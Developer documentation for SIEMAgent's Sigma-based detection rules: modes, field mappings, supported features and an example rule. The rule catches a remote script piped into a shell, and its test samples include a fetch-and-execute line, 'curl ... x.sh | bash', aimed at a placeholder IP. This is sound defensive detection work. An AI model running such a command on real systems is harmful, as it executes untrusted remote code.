# Detection rules

SIEMAgent evaluates [Sigma](https://github.com/SigmaHQ/sigma) rules against
every event before (or alongside) the LLM. Rules catch known-bad activity
deterministically, instantly and for free; the LLM handles what no rule
recognises.

## How rules and the LLM combine

Set `DETECTION_MODE` in `siemagent/.env`:

| Mode | Rule matches | Events no rule matches |
|---|---|---|
| `rules-first` (default) | Classified from the rule alone — **no LLM call** | Sent to the LLM |
| `enrich` | Sent to the LLM; matching rules are attached and can raise the severity | Sent to the LLM |
| `off` | Rules are not evaluated | Sent to the LLM |

In every mode except `off`, if the LLM call fails for an event a rule
matched, the rule's verdict is used, so an LLM outage never drops a known
attack.

A rule verdict maps the rule's metadata onto the event:

| Event field | From the rule |
|---|---|
| Severity | `level`: critical → P1, high → P2, medium → P3, low → P4, informational → P5 |
| Attack type / summary | `title` / `description` |
| MITRE ATT&CK | `tags` such as `attack.t1490` and `attack.impact` |
| Confidence | `status`: stable 0.95, test 0.85, experimental 0.75 |
| Recommended action | `remediation` (extension field) |
| IOCs | URLs, IPv4 addresses and file hashes found in the log line |

Each event records what produced the verdict in `classified_by` (`rules`,
`llm` or `llm+rules`) and the matched rules in `detections`. The dashboard
marks rule verdicts with a **Rule** badge and lists matched rules in the
event detail.

## Rules that ship with SIEMAgent

The built-in pack lives in `siemagent/internal/detection/rules/` and is
compiled into the binary. List what is loaded, with match counts:

```bash
curl -H "X-API-Key: $KEY" http://localhost:8080/api/detections/rules
```

## Adding your own rules or the SigmaHQ collection

Point `SIGMA_RULES_DIR` at a folder of `.yml`/`.yaml` files; it is searched
recursively and loaded at start:

```bash
git clone --depth 1 https://github.com/SigmaHQ/sigma /opt/sigma
SIGMA_RULES_DIR=/opt/sigma/rules/linux
```

Rules using features this engine does not evaluate (see below) are skipped
and counted in the startup log (`skipped_unsupported`). Rules that fail to
parse are logged individually. When two rules share an `id`, the first one
loaded wins (built-in rules load first).

## Writing a rule

```yaml
title: Download Piped Into a Shell
id: e7b7df78-a5d8-47d2-9337-73586ff6fedb   # unique; generate with uuidgen
status: test                               # experimental | test | stable
description: A remote script was downloaded and executed in one step.
tags:
  - attack.command_and_control
  - attack.t1105
detection:
  selection_download:
    message|contains:
      - 'curl '
      - 'wget '
  selection_pipe:
    message|re: '\|\s*(sudo\s+)?(ba|z|da)?sh\b'
  condition: selection_download and selection_pipe
level: high
remediation: Fetch and review the script URL, check for new processes and cron entries.
samples:
  match:
    - 'Oct 11 22:21:00 web01 cron[1]: (www-data) CMD (curl -s http://198.51.100.23/x.sh | bash)'
  no_match:
    - 'Oct 11 22:21:00 web01 bash[1]: curl -s https://api.example.com/health'
```

`remediation` and `samples` are extension fields; other Sigma tools ignore
them. Every built-in rule must have samples: `TestBuiltinRuleSamples` runs
each sample through the real log parser and fails if a `match` line does not
fire or a `no_match` line does. Add a sample for every false positive or miss
you fix — that is how rules stay correct over time.

### Fields

Field names are case-insensitive. Every event has:

| Field | Aliases accepted |
|---|---|
| `message` | `msg`, `CommandLine`, `command_line`, `payload` |
| `hostname` | `host`, `Computer`, `ComputerName` |
| `app_name` | `app`, `application`, `program`, `process`, `ProcessName`, `Image` |
| `proc_id` | `pid`, `ProcessId`, `process_id` |
| `source` | log format: `syslog`, `json` or `raw` |
| `raw` | the original line |

For JSON logs every original field is also available, with nested keys
joined by dots (`user.name`) and arrays joined by spaces. Keyword selections
(lists of plain strings) search the whole raw line.

### Supported Sigma features

- Selections as maps (fields ANDed) or lists of maps (ORed); keyword lists.
- Value lists (ORed, or ANDed with `|all`); `null` for a missing/empty field.
- Modifiers: `contains`, `startswith`, `endswith`, `all`, `re` (with `i` for
  case-insensitive), `cidr`, `exists`.
- Plain values match case-insensitively with `*` and `?` wildcards
  (escape with `\*`, `\?`, `\\`).
- Conditions: `and`, `or`, `not`, parentheses, `1 of <pattern>`,
  `all of <pattern>`, `1 of them`, `all of them`, or a list of conditions.

### Not supported (rule is skipped)

- Aggregations (`| count() by … > N`) and `near` — single-event matching only.
- Sigma correlation rules and rule collections (`action: global`).
- Encoding modifiers: `base64`, `base64offset`, `utf16*`, `wide`, `windash`.

`logsource` is informational: rules are evaluated against every event. Keep
selections specific enough not to fire on unrelated logs.

## Observability

| Metric | Meaning |
|---|---|
| `detection_matches_total{rule,level}` | Matches per rule |
| `llm_calls_saved_total` | Events classified by rules without an LLM call |
